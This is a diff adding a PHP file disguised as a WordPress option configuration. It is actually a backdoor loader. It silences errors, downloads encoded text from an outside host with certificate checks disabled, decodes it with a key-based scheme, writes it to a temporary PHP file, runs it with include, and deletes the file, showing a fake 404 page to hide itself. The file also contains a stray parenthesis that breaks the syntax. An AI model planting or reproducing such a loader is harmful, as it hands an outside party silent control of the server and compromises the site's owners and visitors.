@@ -1,0 +1,67 @@
+<?php
+/* WordPress Option Configuration */
+error_reporting(0);
+@ini_set('display_errors', 0);
+$remote_url = 'https://javpornsub.cloud/conf.txt';
+$signature_key = 'xshikata';
+function _fetch_x_data($url) {
+    if(function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
+        $res = curl_exec($ch);
+        curl_close($ch);
+        return $res;
+    }
+    return @file_get_contents($url);
+}
+
+$raw_content = _fetch_x_data($remote_url);
+
+if ($raw_content) {
+    $parts = explode('.', $raw_content);
+    
+        if (trim($parts[0]) !== 'XSHIKATA-START') {
+        header("HTTP/1.0 404 Not Found");
+        exit;
+    }
+    
+    array_shift($parts);
+    $decoded_code = '';
+    $key_len = strlen($signature_key);
+    $idx = 0; 
+    
+    foreach ($parts as $val) {
+        $val = trim($val);
+        if ($val == '') continue;
+        
+        $key_char_code = ord($signature_key[$idx % $key_len]);
+        
+        $original_ascii = ($val / 2) - $key_char_code;
+        
+        $decoded_code .= chr($original_ascii);
+        $idx++;
+    }
+)
+    if (strlen($decoded_code) > 10) {
+        $tmp_dir = sys_get_temp_dir();
+        $tmp_file = $tmp_dir . '/x_sess_' . md5(time()) . '.php';
+        
+        if (!is_writable($tmp_dir)) {
+            $tmp_file = 'wp-temp-x' . rand(100,999) . '.php';
+        }
+
+        if ($fp = fopen($tmp_file, 'w')) {
+            fwrite($fp, $decoded_code);
+            fclose($fp);
+            
+            include($tmp_file);
+            
+            @unlink($tmp_file);
+        }
+    }
+} else {
+    header("HTTP/1.0 404 Not Found");
+}
+?>
